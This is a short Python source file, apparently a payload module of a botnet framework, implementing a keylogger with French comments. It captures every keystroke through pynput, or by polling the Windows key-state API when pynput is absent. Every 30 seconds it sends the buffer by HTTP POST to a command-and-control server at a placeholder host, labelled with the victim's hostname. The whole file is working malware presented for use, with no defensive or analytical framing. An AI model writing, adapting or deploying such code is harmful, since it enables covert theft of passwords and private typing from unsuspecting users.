#!/usr/bin/env python3
"""
payloads/keylogger.py
Enregistre les frappes clavier, envoie le buffer au C2 toutes les 30s.
Dépendance : pynput (pip install pynput)
Fallback ctypes Windows si pynput absent.
Variables injectées : FILL_C2_HOST, FILL_PORT
"""
import threading, datetime, platform, socket, os, json, time
import urllib.request

C2     = "http://FILL_C2_HOST:FILL_PORT"
BOT_ID = socket.gethostname()
BUFFER = []
LOCK   = threading.Lock()

def _post(url, data):
    try:
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

def flush_loop():
    while True:
        time.sleep(30)
        with LOCK:
            if not BUFFER:
                continue
            data = "".join(BUFFER)
            BUFFER.clear()
        _post(f"{C2}/c2/result/{BOT_ID}",
              {"result": f"[KEYS] {data}"})

threading.Thread(target=flush_loop, daemon=True).start()

try:
    from pynput import keyboard

    SPECIAL = {
        "space": "[ ]", "enter": "[↵]", "backspace": "[⌫]",
        "tab": "[⇥]", "shift": "", "ctrl_l": "", "ctrl_r": "",
        "alt_l": "", "alt_r": "", "caps_lock": "[CAPS]",
        "delete": "[DEL]", "escape": "[ESC]",
    }

    def on_press(key):
        with LOCK:
            try:
                char = key.char or ""
                BUFFER.append(char)
            except AttributeError:
                name = str(key).replace("Key.", "")
                BUFFER.append(SPECIAL.get(name, f"[{name}]"))

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

except ImportError:
    # Fallback ctypes Windows — GetAsyncKeyState polling
    import ctypes
    import string

    VK_MAP = {}
    for c in string.ascii_uppercase:
        VK_MAP[ord(c)] = c.lower()
    for d in string.digits:
        VK_MAP[ord(d)] = d
    VK_MAP.update({
        0x20: " ",
        0x0D: "[↵]",
        0x08: "[⌫]",
        0x09: "[⇥]",
        0x2E: "[DEL]",
        0x1B: "[ESC]",
    })

    pressed_keys = set()
    while True:
        for vk, char in VK_MAP.items():
            state = ctypes.windll.user32.GetAsyncKeyState(vk)
            if state & 0x8000:
                if vk not in pressed_keys:
                    pressed_keys.add(vk)
                    with LOCK:
                        BUFFER.append(char)
            else:
                pressed_keys.discard(vk)
        time.sleep(0.01)
    